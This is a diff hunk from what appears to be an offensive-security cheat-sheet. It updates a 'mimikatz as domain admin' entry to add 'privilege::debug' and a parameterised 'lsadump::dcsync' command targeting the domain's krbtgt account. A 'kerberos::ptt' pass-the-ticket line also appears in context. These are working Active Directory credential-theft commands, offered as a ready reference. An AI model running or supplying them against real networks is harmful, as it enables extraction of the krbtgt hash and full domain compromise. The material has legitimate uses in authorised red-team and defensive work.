@@ -259,7 +259,8 @@ kerberos::ptt $TICKET
 mimikatz as domain admin:
 #mimikatz #dcsync #dc-sync #krbtgt
 ```powershell
-lsadump::dcsync /user:corp\krbtgt
+privilege::debug
+lsadump::dcsync /user:$AD_DOMAIN\krbtgt
 ```
 
 DCOM:
